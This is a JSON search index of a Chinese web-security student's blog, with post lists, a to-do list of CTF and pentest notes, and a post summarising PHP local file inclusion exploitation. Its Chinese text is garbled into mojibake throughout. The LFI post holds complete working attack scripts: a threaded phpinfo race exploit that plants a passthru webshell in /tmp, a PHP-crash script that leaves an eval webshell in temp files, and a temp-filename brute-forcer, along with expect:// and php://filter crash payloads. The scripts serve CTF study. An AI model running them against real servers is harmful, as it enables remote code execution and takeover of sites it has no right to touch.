{"pages":[{"title":"About","date":"2020-09-26T13:03:31.662Z","path":"about/index.html","text":"Ca01h å—äº¬é‚®ç”µå¤§å­¦åœ¨è¯»ç ”ç©¶ç”Ÿ Webå®‰å…¨å­¦ä¹ ingâ€¦ è”ç³»æ–¹å¼ï¼šNTExOTY1NzM4QHFxLmNvbQ=="},{"title":"Categories","date":"2020-09-26T13:03:31.664Z","path":"categories/index.html","text":""},{"title":"Tags","date":"2020-09-26T13:03:31.667Z","path":"tags/index.html","text":""}],"posts":[{"title":"menu","date":"2020-09-26T11:57:04.681Z","path":"menu/","text":"æ–‡ç« å½’æ¡£ ç½®é¡¶æ–‡ç«  Linux Enumeration Webå®‰å…¨ Webå®‰å…¨åŸºç¡€ åœ¨Ubuntu18.04å®‰è£…LNMP MySQLæ•°æ®åº“åŸºæœ¬æ“ä½œ MySQLçš„ç³»ç»Ÿè¡¨ã€æ–‡ä»¶è¯»å†™ æ•°æ®åº“ç³»ç»ŸåŠŸèƒ½ç›¸å…³å­¦ä¹  æ•°æ®åº“æ³¨å…¥è¯­å¥çš„æ”¶é›†å’Œå­¦ä¹  Webé¡µé¢è§£æçš„æµç¨‹å­¦ä¹  å„ç§æ³¨å…¥ç±»å‹çš„ç¯å¢ƒæ­å»ºå’Œä»£ç ç¼–å†™ Sqli-labsæ‰‹å·¥æ³¨å…¥(ä¸€) Sqli-labsæ‰‹å·¥æ³¨å…¥(äºŒ) SQLMapå…¥é—¨å­¦ä¹  SQLæ³¨å…¥â€”â€”åŒæŸ¥è¯¢æ³¨å…¥ XSSæ¼æ´å®æˆ˜å­¦ä¹  æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨ å˜é‡è¦†ç›–æ¼æ´åˆ©ç”¨ æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ©ç”¨ SSRFæ¼æ´åˆ©ç”¨ å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ©ç”¨ é€»è¾‘æ¼æ´åˆ©ç”¨ XXEæ¼æ´åˆ©ç”¨ NoSQLæ³¨å…¥ä¹‹MongoDB SQLæ³¨å…¥ä¸“é¡¹ä¹‹MySQLåŸºæœ¬æ³¨å…¥è¯­æ³• æµ…è°ˆLDAPæ³¨å…¥æ”»å‡» PHPç›¸å…³ PHPå›è°ƒåé—¨ PHPååºåˆ—åŒ–â€”â€”åŸºç¡€ç¯‡ PHPååºåˆ—åŒ–â€”â€”Phar PHPååºåˆ—åŒ–â€”â€”Session PHPååºåˆ—åŒ–-åŸç”Ÿç±»åˆ©ç”¨ PHPæ— æ•°å­—å­—æ¯æ„é€ webshell PHPæ— å‚æ•°å‡½æ•°çš„åˆ©ç”¨ SoapClient+SSRF+CRLFåˆ©ç”¨ PHP LFI to RCE Writeups CGCTF-Writeup BUUCTFâ€”PHPä»£å®¡ BUUCTFâ€”PHPæ¡†æ¶æ¼æ´ BUUCTFâ€”PHPååºåˆ—åŒ– BUUCTFâ€”SQLæ³¨å…¥ BUUCTFâ€”XSS BUUCTFâ€”SSRF BUUCTFâ€”å‘½ä»¤æ‰§è¡Œ BUUCTFâ€”æ–‡ä»¶ä¸Šä¼  BUUCTFâ€”æ–‡ä»¶åŒ…å« BUUCTFâ€”Python BUUCTFâ€”NodeJS BUUCTFâ€”Rubyå’ŒGo BUUCTFâ€”æ¸—é€æµ‹è¯• 2020ç”µä¿¡å¤©ç¿¼æ¯CTFâ€”APITest æ˜Ÿç›Ÿ6æœˆAWD Web+Pwn DASCTF2020ä¸ƒæœˆèµ› Web CSICTF2020 Web+Linux 2020ç¬¬äº”ç©ºé—´CTF Web é¦–å±Šé’“é±¼åŸæ¯CTF DASCTFå…«æœˆèµ› é¶æœºç³»åˆ— HackTheBox HTB::OpenAdmin HTB::Postman HTB::Traverxec HTB::Obscurity HTB::Mongo HTB::Tenten HTB::Sneaky HTB::Teacher HTB::Irked HTB::Traceback HTB::DevOops HTB::Blocky HTB::Beep HTB::Book HTB::Craft HTB::CTF HTB::Magic HTB::CTF VulnHub VulnHub::BossplayersCTF VulnHub::DC-1 VulnHub::DigitalWorld:JOY ä»£ç å®¡è®¡ PHPä»£ç å®¡è®¡ PHPä»£ç å®¡è®¡å­¦ä¹ â€”Day1 PHPä»£ç å®¡è®¡å­¦ä¹ â€”Day2 PHPä»£ç å®¡è®¡å­¦ä¹ â€”Day3 PHPä»£ç å®¡è®¡å­¦ä¹ â€”Day4 PHPä»£ç å®¡è®¡å­¦ä¹ â€”Day5 PHPä»£ç å®¡è®¡å¤ç°â€”yixuncms PHPä»£ç å®¡è®¡å¤ç°â€”chinaz æµé‡åˆ†æ Datacon2019-q1-wp-v1 Datacon2019-q1-wp-v2 Broè¯­æ³•å­¦ä¹ ä¹‹åŸºç¡€çŸ¥è¯† æœºå™¨å­¦ä¹  åŸºç¡€å­¦ä¹  Machine-Learning-Week1 Machine-Learning-Week2 Machine-Learning-Week3 æœºå™¨å­¦ä¹ ä¸ç½‘ç»œå®‰å…¨ç›¸å…³çš„èµ„æ–™ï¼ˆè½¬ï¼‰ Python Pythonç¼–ç¨‹ Pythonå‡½æ•°çš„å‚æ•° Pythonå‡½æ•°å¼ç¼–ç¨‹ä¹‹é«˜é˜¶å‡½æ•° Pythonå‡½æ•°å¼ç¼–ç¨‹-é—­åŒ… Pythonå‡½æ•°å¼ç¼–ç¨‹-è£…é¥°å™¨ Pythoné¢å‘å¯¹è±¡é«˜çº§ç¼–ç¨‹ä¹‹slotsã€@propertyå’Œå¤šé‡ç»§æ‰¿ PythonIOç¼–ç¨‹ Java Javaç¼–ç¨‹ JavaåŸºç¡€å­¦ä¹ ä¹‹JDKã€JREã€JVM JavaåŸºç¡€å­¦ä¹ ä¹‹æ ¸å¿ƒç±» JavaåŸºç¡€å­¦ä¹ ä¹‹é¢å‘å¯¹è±¡åŸºç¡€ JavaåŸºç¡€å­¦ä¹ ä¹‹å¼‚å¸¸å¤„ç† ç®—æ³• Leetcode Leetcode-Primary-class éšç¬” ç»éªŒ ä»0åˆ°100åˆ†çš„è·¯ç¨‹â€”â€”å†™åœ¨2019å¹´çš„æœ€åä¸€å¤© æŠ€æœ¯ é˜¿é‡Œäº‘Centos7-Ngnixéƒ¨ç½²Hexo é˜¿é‡Œäº‘OSS-PicGoæ­å»ºMarkdownå›¾åºŠ Hexoæ¸²æŸ“LaTeXæ•°å­¦å…¬å¼ Git CheatSheet Tmux CheatSheet","tags":[],"categories":[]},{"title":"ca01hã®ç¬”è®°æœ¬","date":"2020-09-26T11:57:04.671Z","path":"home/","text":"wiki1234567 _____ ___ _____ ___ _ _ _____ _ _____ _____ &#x2F; ___| &#x2F; | &#x2F; _ \\ |_ | | | | | | _ \\ | | &#x2F; _ \\ &#x2F; ___| | | &#x2F; &#x2F;| | | | | | | | | |_| | | |_| | | | | | | | | | | | &#x2F; &#x2F; | | | |&#x2F;| | | | | _ | | _ | | | | | | | | | _ | |___ &#x2F; &#x2F; | | | |_| | | | | | | | | |_| | | |___ | |_| | | |_| | \\_____| &#x2F;_&#x2F; |_| \\_____&#x2F; |_| |_| |_| |_____&#x2F; |_____| \\_____&#x2F; \\_____&#x2F; ca01h@æ˜Ÿç›Ÿå®‰å…¨ NTExOTY1NzM4QHFxLmNvbQ== äº’è”ç½‘æ—¶ä»£çš„çŸ¥è¯†æ˜¯é›¶æ•£çš„ï¼Œéœ€è¦æœ‰ä¸€ä¸ªå†™å­—çš„åœ°æ–¹ï¼ŒæŠŠé›¶æ•£çš„çŸ¥è¯†æ±‡èšèµ·æ¥ï¼Œä»¥ç‚¹è¿çº¿ï¼Œä»¥çº¿èšé¢ï¼Œä¸€æ–¹é¢èƒ½å½¢æˆä¸€ä¸ªå®Œæ•´çš„çŸ¥è¯†ä½“ç³»ï¼Œå¦ä¸€æ–¹é¢è‡ªå·±æ‰€éœ€ä¹‹æ—¶æ–¹ä¾¿æŸ¥é˜…ï¼Œäºæ˜¯ä¹å°±è¯ç”Ÿäº†ca01hã®ç¬”è®°æœ¬ã€‚ TODO LIST 2020 ã€æœªå®Œæˆã€‘SCTFå¤ç›˜ï¼šhttps://github.com/SycloverSecurity/SCTF2020/tree/master/Web ã€æœªå®Œæˆã€‘Thinkphp-vuln September ã€æœªå®Œæˆã€‘å®ä¹ +HW ã€æœªå®Œæˆã€‘DataConå¤ç›˜ August ã€å·²å®Œæˆã€‘XCTFâ€”â€”WMCTFï¼ˆæœ‰å¹¸åšäº†ä¸€ä¸ªç­¾åˆ°é¢˜ ã€å·²å®Œæˆã€‘DataCon2020 DNSæ¶æ„æµé‡åˆ†æï¼ˆæœ‰å¹¸æ··äº†ä¸€ä¸ªé¼“åŠ±å¥– DNSæ¶æ„åŸŸååˆ†æ https://mp.weixin.qq.com/s/y0Wv5ci30HIhXp5bbCZxRg åŠ å¯†æ¶æ„æµé‡æ£€æµ‹ åˆèµ›ï¼šhttps://s1mple.online/2020/08/09/DataCon2020-åŠ å¯†æ¶æ„æµé‡æ£€æµ‹åˆèµ›-Writeup-åŠæ€»ç»“åæ€/ åƒµå°¸ç½‘ç»œåˆ†æ ç¬¬ä¸€é¢˜ï¼šhttps://www.cdxy.me/?p=829 ç¬¬ä¸‰é¢˜ï¼šhttps://zhuanlan.zhihu.com/p/186948840 ç½‘ç»œé»‘äº§åˆ†æ æ¶æ„ä»£ç åˆ†æ https://github.com/yuriufo/DataCon2020 https://zhuanlan.zhihu.com/p/187535672 https://zhuanlan.zhihu.com/p/185715807 ã€å·²å®Œæˆã€‘é¦–å±Šé’“é±¼åŸæ¯CTF ã€å·²å®Œæˆã€‘HW ã€å·²å®Œæˆã€‘æ–‡ä»¶è§£ææ¼æ´ ã€æœªå®Œæˆã€‘ã€Šæœºå™¨å­¦ä¹ å®æˆ˜ã€‹å‰ä¸ƒç«  ã€å·²å®Œæˆã€‘BUUCTFåˆ·é¢˜ ã€æœªå®Œæˆã€‘HackTheBox OpenKeysï¼ˆè´¦å·åˆè¢«å°äº†ã€‚ã€‚ã€‚ ã€æœªå®Œæˆã€‘PHPæ„é€ ååºåˆ—åŒ–é“¾å†å­¦ä¹  July ã€å·²å®Œæˆã€‘ç¬¬äº”ç©ºé—´CTFå¤ç›˜ ã€å·²å®Œæˆã€‘DASCTFä¸ƒæœˆèµ›å¤ç›˜ ã€å·²å®Œæˆã€‘CSICTF2020å¤ç›˜ ã€å·²å®Œæˆã€‘2020ç”µä¿¡å¤©ç¿¼æ¯CTF ã€æœªå®Œæˆã€‘SUCTF2019 Upload2 ã€æœªå®Œæˆã€‘N1CTF2018 Easy&amp;&amp;Hard PHP https://xz.aliyun.com/t/2148 https://github.com/wonderkun/CTF_web/tree/master/web600-1?1520941487499 ã€æœªå®Œæˆã€‘Flask/Jinja2 SSTI &amp;&amp; Python æ²™ç®±é€ƒé€¸åŸºç¡€ ã€æœªå®Œæˆã€‘PHPå†™é…ç½®æ¼æ´ ã€æœªå®Œæˆã€‘PHPå¼±ç±»å‹æ¯”è¾ƒ ã€æœªå®Œæˆã€‘Code Breaking 2018æŒ‘æˆ˜èµ›å­¦ä¹ â€”â€”æ­£åˆ™å›æº¯ ã€å·²å®Œæˆã€‘HackTheBox Tabby ã€å·²å®Œæˆã€‘HackTheBox Sneakymailer ã€æœªå®Œæˆã€‘Flask Pinç å®‰å…¨ June ã€å·²å®Œæˆã€‘RCTF2020ï¼ˆè¢«å®Œè™ã€‚ã€‚ğŸ˜­çº¯ç²¹é ç€é˜Ÿé‡Œçš„pwnå¸ˆå‚…æŠ¬ç€èµ°) ã€å·²å®Œæˆã€‘PHPååºåˆ—åŒ–â€”â€”Phar ã€å·²å®Œæˆã€‘PHPååºåˆ—åŒ–â€”â€”Session ã€æœªå®Œæˆã€‘æ–°æ˜¥æˆ˜å½¹ Hackmeï¼šhttps://www.mrkaixin.top/posts/df9f633e/#5-0-hackme filter_varç»•è¿‡ï¼šhttps://www.secpulse.com/archives/67064.html ç»•è¿‡å››ä¸ªå­—ç¬¦é™åˆ¶getshellï¼šhttps://www.anquanke.com/post/id/87203 ã€å·²å®Œæˆã€‘PHPååºåˆ—åŒ–â€”â€”Soapclient LCTF bestphpâ€™s revenge ã€æœªå®Œæˆã€‘PHPååºåˆ—åŒ–â€”â€”å­—ç¬¦é€ƒé€¸ ã€æœªå®Œæˆã€‘PHPååºåˆ—åŒ–â€”â€”Bypass ã€æœªå®Œæˆã€‘ä»£ç å®¡è®¡å­¦ä¹ â€”â€”PHP-Audit-Code Day1-6 ã€æœªå®Œæˆã€‘phpinfoä¸­çš„å…³é”®ä¿¡æ¯ ã€æœªå®Œæˆã€‘Rediså®‰å…¨å­¦ä¹  ã€å·²å®Œæˆã€‘BUUCTFåˆ·é¢˜ ã€å·²å®Œæˆã€‘XMCTFè§£é¢˜ ã€å·²å®Œæˆã€‘ç¬¬äº”ç©ºé—´CTFæ¯”èµ›ï¼ˆ2020.06.24ï¼‰ï¼ˆèœå°±ä¸€ä¸ªå­—ã€‚ã€‚ã€‚ï¼‰ ã€å·²å®Œæˆã€‘é˜Ÿå†…AWDè®­ç»ƒèµ›ï¼ˆ2020.06.28ï¼‰ Awesome Articals/Projects Bypass &amp; Tricks PHP preg_matchç»•è¿‡ å‚è€ƒæ–‡ç« ï¼šhttps://www.cnblogs.com/20175211lyz/p/12198258.html æ•°ç»„ç»•è¿‡ PCREå›æº¯é™åˆ¶ï¼ˆcode-breaking2018ï¼‰ æ¢è¡Œç¬¦ PHPå­—ç¬¦ä¸²è§£æç‰¹æ€§ç»•è¿‡ å‚è€ƒæ–‡ç« ï¼šhttps://www.freebuf.com/articles/web/213359.html å€Ÿç”¨ä¸€å¼ å›¾ç®€å•åœ°è®°ä¸€ä¸‹ SSRF fileåè®®ç»•è¿‡ å¦‚æœSSRFä¸­file://å…³é”®å­—è¢«ç¦ç”¨ï¼Œå¯ä»¥ä½¿ç”¨file:/æˆ–è€…file:///æ¥ä»£æ›¿ã€‚ ä¾‹é¢˜ï¼š[GKCTF2020]EZä¸‰å‰‘å®¢-EzWeb Sessionç»•è¿‡ åˆ é™¤cookieï¼Œæ²¡æœ‰cookieä¸­çš„SESSIONIDå°±æ‰¾ä¸åˆ°å¯¹åº”çš„sessionæ–‡ä»¶ï¼Œç›¸åº”çš„$_SESSION['var']å°±ä¸ºNULLï¼Œç›¸å½“äºä¼ å‚NULLã€‚ ä¾‹é¢˜ï¼šBJDCTF2nd æ–‡ä»¶æ¢æµ‹ åˆ©ç”¨æ•°ç»„ç»•è¿‡ 1234567md5(Array()) = nullsha1(Array()) = nullereg(pattern,Array()) = nullpreg_match(pattern,Array()) = falsestrcmp(Array(), &quot;abc&quot;) = nullstrpos(Array(),&quot;abc&quot;) = nullstrlen(Array()) = null ä¾‹é¢˜ï¼š0CTF2016 piapiapia basenameç»•è¿‡ ä» https://bugs.php.net/bug.php?id=62119 æ‰¾åˆ°äº†basename()å‡½æ•°çš„ä¸€ä¸ªé—®é¢˜ï¼Œå®ƒä¼šå»æ‰æ–‡ä»¶åå¼€å¤´çš„éASCIIå€¼ï¼š 12var_dump(basename(&quot;xffconfig.php&quot;)); // =&gt; config.phpvar_dump(basename(&quot;config.php/xff&quot;)); // =&gt; config.php ä¾‹é¢˜ï¼š[Zer0pts2020]Can you guess it? .htaccessåˆ©ç”¨ https://www.cnblogs.com/20175211lyz/p/11741348.html#htaccess-tricksæ€»ç»“ Linuxå…¥ä¾µæ£€æµ‹ https://github.com/grayddq/GScan çº¢è“å¯¹æŠ— https://github.com/yeyintminthuhtut/Awesome-Red-Teaming https://github.com/hudunkey/Red-Team-links ä»£ç å®¡è®¡ https://github.com/CHYbeta/Code-Audit-Challenges https://github.com/hongriSec/PHP-Audit-Labs WAF https://wh0ale.github.io/2019/12/04/wafä»å…¥é—¨åˆ°Bypass/ https://weibo.com/ttarticle/p/show?id=2309404007261092631700#_loginLayer_1579837230756 javaå®‰å…¨ https://github.com/threedr3am/learnjavabug Pythonå®‰å…¨ https://github.com/bit4woo/python_sec å­—å…¸ https://github.com/insightglacier/Dictionary-Of-Pentesting æ±‚èŒ https://github.com/geekcompany/ResumeSample https://github.com/zhaoweiho/web-sec-interview https://github.com/EvilAnne/Pentest_questions","tags":[],"categories":[]},{"title":"PHP LFIåˆ©ç”¨æ€»ç»“","date":"2020-09-21T02:17:16.000Z","path":"Web_security/php_related/12.PHPçš„LFIåˆ©ç”¨æ€»ç»“/","text":"PHP LFIåˆ©ç”¨æ€»ç»“ å‚è€ƒæ–‡ç« ï¼šhttps://www.anquanke.com/post/id/177491 proc/self/environ å‰ç½®æ¡ä»¶ phpä»¥cgiæ–¹å¼è¿è¡Œï¼Œè¿™æ ·environæ‰ä¼šä¿æŒUAå¤´ã€‚ environæ–‡ä»¶å­˜å‚¨ä½ç½®å·²çŸ¥ï¼Œä¸”environæ–‡ä»¶å¯è¯»ã€‚ åˆ©ç”¨æ–¹å¼ å¦‚æœå¯ä»¥è¯»å–ï¼Œä¿®æ”¹User-Agentä¸ºphpä»£ç ï¼Œç„¶ålfiç‚¹åŒ…å«ï¼Œå®ç°rceã€‚ proc/self/fd/1,2,3â€¦ å‰ç½®æ¡ä»¶ phpä»¥cgiæ–¹å¼è¿è¡Œã€‚ environæ–‡ä»¶å­˜å‚¨ä½ç½®å·²çŸ¥ï¼Œä¸”environæ–‡ä»¶å¯è¯»ã€‚ ç±»ä¼¼äº/proc/self/environï¼Œä¸åŒæ˜¯åœ¨refereræˆ–æŠ¥é”™ç­‰å†™å…¥phpä»£ç ï¼Œç„¶ålfiç‚¹åŒ…å«ï¼Œå®ç°rceã€‚ PHPä¼ªåè®® å¸¸ç”¨ä¼ªåè®® expect:// å‰ç½®æ¡ä»¶ é»˜è®¤ä¸å¼€å¯ï¼Œéœ€è¦å®‰è£…PECL packageæ‰©å±• éœ€è¦allow_url_includeå¼€å¯ åˆ©ç”¨æ–¹å¼ 1expect:&#x2F;&#x2F;[command] æ—¥å¿— Apacheæ—¥å¿— åœ¨ä¸€äº›åœºæ™¯ä¸­ï¼Œlogçš„åœ°å€æ˜¯è¢«ä¿®æ”¹æ‰çš„ã€‚ä½ å¯ä»¥é€šè¿‡è¯»å–ç›¸åº”çš„é…ç½®æ–‡ä»¶åï¼Œå†è¿›è¡ŒåŒ…å«ã€‚ CTFå®ä¾‹ï¼š https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/#Methon-Two with phpinfo åœ¨å¯ä»¥è®¿é—®phpinfoçš„æƒ…å†µä¸‹ï¼Œç–¯ç‹‚ä¸Šä¼ å¤§æ–‡ä»¶ï¼ŒåŒæ—¶åœ¨phpinfoä¸­å¯ä»¥çœ‹åˆ°ä¸Šä¼ çš„æ–‡ä»¶åœ¨tmpç›®å½•ä¸‹çš„æ–‡ä»¶åï¼Œæ¡ä»¶ç«äº‰ï¼Œåœ¨æ–‡ä»¶è¢«åˆ é™¤ä¹‹å‰åŒ…å«è¿›æ¥getshellã€‚ åˆ©ç”¨è„šæœ¬ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177#!/usr/bin/pythonimport sysimport threadingimport socketdef setup(host, port): TAG=&quot;Security Test&quot; PAYLOAD=&quot;&quot;&quot;%sr&lt;?php $c=fopen(&#x27;/tmp/g&#x27;,&#x27;w&#x27;);fwrite($c,&#x27;&lt;?php passthru($_GET[&quot;f&quot;]);?&gt;&#x27;);?&gt;r&quot;&quot;&quot; % TAG REQ1_DATA=&quot;&quot;&quot;-----------------------------7dbff1ded0714rContent-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;rContent-Type: text/plainrr%s-----------------------------7dbff1ded0714--r&quot;&quot;&quot; % PAYLOAD padding=&quot;A&quot; * 5000 REQ1=&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;+padding+&quot;&quot;&quot; HTTP/1.1rCookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;+padding+&quot;&quot;&quot;rHTTP_ACCEPT: &quot;&quot;&quot; + padding + &quot;&quot;&quot;rHTTP_USER_AGENT: &quot;&quot;&quot;+padding+&quot;&quot;&quot;rHTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;+padding+&quot;&quot;&quot;rHTTP_PRAGMA: &quot;&quot;&quot;+padding+&quot;&quot;&quot;rContent-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714rContent-Length: %srHost: %srr%s&quot;&quot;&quot; %(len(REQ1_DATA),host,REQ1_DATA) #modify this to suit the LFI script# LFIREQ=&quot;&quot;&quot;GET /lfi.php?file=%s%%00 HTTP/1.1r# User-Agent: Mozilla/4.0r# Proxy-Connection: Keep-Aliver# Host: %sr# r# r# &quot;&quot;&quot; LFIREQ=&quot;&quot;&quot;GET /lfi.php?file=%s HTTP/1.1rUser-Agent: Mozilla/4.0rProxy-Connection: Keep-AliverHost: %srrr&quot;&quot;&quot; return (REQ1, TAG, LFIREQ)def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s2.connect((host, port)) s.send(phpinforeq) d = &quot;&quot; while len(d) &lt; offset: d += s.recv(offset) try: i = d.index(&quot;[tmp_name] =&amp;gt&quot;) fn = d[i+17:i+31] # print fn except ValueError: return None s2.send(lfireq % (fn, host)) d = s2.recv(4096) s.close() s2.close() if d.find(tag) != -1: return fncounter=0class ThreadWorker(threading.Thread): def __init__(self, e, l, m, *args): threading.Thread.__init__(self) self.event = e self.lock = l self.maxattempts = m self.args = args def run(self): global counter while not self.event.is_set(): with self.lock: if counter &gt;= self.maxattempts: return counter+=1 try: x = phpInfoLFI(*self.args) if self.event.is_set(): break if x: print &quot;nGot it! Shell created in /tmp/g&quot; self.event.set() except socket.error: returndef getOffset(host, port, phpinforeq): &quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host,port)) s.send(phpinforeq) d = &quot;&quot; while True: i = s.recv(4096) d+=i if i == &quot;&quot;: break # detect the final chunk if i.endswith(&quot;0rnrn&quot;): break s.close() i = d.find(&quot;[tmp_name] =&amp;gt&quot;) if i == -1: raise ValueError(&quot;No php tmp_name in phpinfo output&quot;) print &quot;found %s at %i&quot; % (d[i:i+10],i) # padded up a bit return i+256def main(): print &quot;LFI With PHPInfo()&quot; print &quot;-=&quot; * 30 if len(sys.argv) &lt; 2: print &quot;Usage: %s host [port] [threads]&quot; % sys.argv[0] sys.exit(1) try: host = socket.gethostbyname(sys.argv[1]) except socket.error, e: print &quot;Error with hostname %s: %s&quot; % (sys.argv[1], e) sys.exit(1) port=80 try: port = int(sys.argv[2]) except IndexError: pass except ValueError, e: print &quot;Error with port %d: %s&quot; % (sys.argv[2], e) sys.exit(1) poolsz=10 try: poolsz = int(sys.argv[3]) except IndexError: pass except ValueError, e: print &quot;Error with poolsz %d: %s&quot; % (sys.argv[3], e) sys.exit(1) print &quot;Getting initial offset...&quot;, reqphp, tag, reqlfi = setup(host, port) offset = getOffset(host, port, reqphp) sys.stdout.flush() maxattempts = 1000 e = threading.Event() l = threading.Lock() print &quot;Spawning worker pool (%d)...&quot; % poolsz sys.stdout.flush() tp = [] for i in range(0,poolsz): tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag)) for t in tp: t.start() try: while not e.wait(1): if e.is_set(): break with l: sys.stdout.write( &quot;r% 4d / % 4d&quot; % (counter, maxattempts)) sys.stdout.flush() if counter &gt;= maxattempts: break print if e.is_set(): print &quot;Woot! m/&quot; else: print &quot;:(&quot; except KeyboardInterrupt: print &quot;nTelling threads to shutdown...&quot; e.set() print &quot;Shuttin&#x27; down...&quot; for t in tp: t.join()if __name__==&quot;__main__&quot;: main() with phpå´©æºƒ php segfault å‘PHPå‘é€å«æœ‰æ–‡ä»¶åŒºå—çš„æ•°æ®åŒ…æ—¶ï¼Œè®©PHPå¼‚å¸¸å´©æºƒé€€å‡ºï¼ŒPOSTçš„ä¸´æ—¶æ–‡ä»¶å°±ä¼šè¢«ä¿ç•™ 1. php &lt; 7.2 php://filter/string.strip_tags/resource=/etc/passwd 2. php7 è€ç‰ˆæœ¬é€šæ€ php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA åˆ©ç”¨è„šæœ¬ 123456789101112131415161718192021222324252627# -*- coding: utf-8 -*-# phpå´©æºƒ ç”Ÿæˆå¤§é‡ä¸´æ—¶æ–‡ä»¶import requestsimport stringdef upload_file(url, file_content): files = &#123;&#x27;file&#x27;: (&#x27;test.jpg&#x27;, file_content, &#x27;image/jpeg&#x27;)&#125; try: requests.post(url, files=files) except Exception as e: print echarset = string.digits+string.letterswebshell = &#x27;&lt;?php eval($_REQUEST[daolgts]);?&gt;&#x27;.encode(&quot;base64&quot;).strip()file_content = &#x27;&lt;?php if(file_put_contents(&quot;/tmp/daolgts&quot;, base64_decode(&quot;%s&quot;)))&#123;echo &quot;success&quot;;&#125;?&gt;&#x27; % (webshell)url=&quot;&quot;parameter=&quot;&quot;payload1=&quot;php://filter/string.strip_tags/resource=/etc/passwd&quot;payload2=r&quot;php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA&quot;lfi_url = url+&quot;?&quot;+parameter+&quot;=&quot;+payload1length = 6times = len(charset) ** (length / 2)for i in xrange(times): print &quot;[+] %d / %d&quot; % (i, times) upload_file(lfi_url, file_content) çˆ†ç ´tmpæ–‡ä»¶å ç„¶åçˆ†ç ´ä¸´æ—¶æ–‡ä»¶åæ¥åŒ…å« 12345678910111213141516171819202122232425# -*- coding: utf-8 -*-import requestsimport stringcharset = string.digits + string.lettersbase_url=&quot;&quot;parameter=&quot;&quot;for i in charset: for j in charset: for k in charset: for l in charset: for m in charset: for n in charset: filename = i + j + k + l + m + n url = base_url+&quot;?&quot;+parameter+&quot;=/tmp/php&quot;+filename print url try: response = requests.get(url) if &#x27;success&#x27; in response.content: print &quot;[+] Include success!&quot; print &quot;url:&quot;+url exit() except Exception as e: print e session åˆ©ç”¨æ¡ä»¶ sessionæ–‡ä»¶è·¯å¾„å·²çŸ¥ï¼Œä¸”å…¶ä¸­å†…å®¹éƒ¨åˆ†å¯æ§ã€‚ åˆ©ç”¨æ–¹å¼ å½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶POSTä¸€ä¸ªä¸INIä¸­è®¾ç½®çš„session.upload_progress.nameåŒåå˜é‡æ—¶ï¼Œä¸Šä¼ è¿›åº¦å¯ä»¥åœ¨$_SESSIONä¸­è·å¾—ã€‚ å½“PHPæ£€æµ‹åˆ°è¿™ç§POSTè¯·æ±‚æ—¶ï¼Œå®ƒä¼šåœ¨$_SESSIONä¸­æ·»åŠ ä¸€ç»„æ•°æ®, ç´¢å¼•æ˜¯ session.upload_progress.prefixä¸session.upload_progress.nameè¿æ¥åœ¨ä¸€èµ·çš„å€¼ã€‚ ä¹Ÿå°±æ˜¯è¯´sessionä¸­ä¼šæ·»åŠ session.upload_progress.prefix+$_POST[ini_get['session.upload_progress.name']],è€Œsession.upload_progress.nameæ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥å°±å¯ä»¥åœ¨sessionå†™å…¥phpä»£ç ï¼Œç„¶ååŒ…å«sessionæ–‡ä»¶æ¥rce","tags":[],"categories":[]},{"title":"ã€Šæœºå™¨å­¦ä¹ å®æˆ˜ã€‹ç¬”è®°â€”â€”å†³ç­–æ ‘","date":"2020-09-15T03:14:09.000Z","path":"2.ã€Šæœºå™¨å­¦ä¹ å®æˆ˜ã€‹ç¬”è®°â€”â€”å†³ç­–æ ‘/","text":"","tags":[],"categories":[]},{"title":"DASCTFå…«æœˆèµ›WP","date":"2020-09-05T11:53:18.000Z","path":"Web_security/ctf_writeup/23.DASCTF2020å…«æœˆèµ›/","text":"DASCTFå…«æœˆèµ› Web Writeup å®‰æ’å¤§å­¦ è€ƒç‚¹ æ¸—é€æµ‹è¯• SQLæŠ¥é”™æ³¨å…¥ è§£é¢˜ y1ngå¸ˆå‚…å‡ºçš„ä¸€é“é¢˜ï¼Œéå¸¸é¡¶ï¼Œå¯ä»¥è¯´æ˜¯è¿™æ˜¯ä¸€é“å®æˆ˜æ”¹ç¼–é¢˜ï¼Œy1ngå¸ˆå‚…åœ¨åšæ¸—é€æµ‹è¯•æ—¶ï¼Œåœ¨ä¸€ä¸ªç³»ç»Ÿçš„æŸä¸ªä¸èµ·çœ¼çš„åœ°æ–¹â€”â€”é‚®ä»¶æ¿€æ´»é“¾æ¥å‘ç°äº†SQLæ³¨å…¥ï¼Œå¹¶å¾—åˆ°äº†å…¨æ ¡æ‰€æœ‰å­¦ç”Ÿçš„å†…ç½‘å¹³å°è´¦å·å¯†ç ï¼Œè€Œå­¦ç”Ÿçš„æ‰€æœ‰ä¿¡æ¯ã€æ‰€æœ‰ç½‘ä¸ŠåŠäº‹ç­‰ç­‰å‡ ä¹éƒ½ä½¿ç”¨æ ¡å†…ç½‘å¹³å°çš„è´¦å·å¯†ç ã€‚ 